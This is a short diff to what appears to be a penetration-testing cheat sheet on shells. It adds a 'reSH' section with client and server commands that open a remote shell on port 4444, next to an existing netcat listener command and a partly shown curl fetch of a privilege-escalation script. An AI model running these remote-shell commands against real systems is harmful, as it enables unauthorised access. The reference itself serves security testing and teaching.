@@ -24,6 +24,14 @@ curl https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-
 ```
 nc -lp 4444
 ```
+### reSH
+```
+# Client
+resh ip 4444
+# Server
+resh 4444
+```
+[Source](/scripts/resh.py)
 
 ### Netcat
 ```
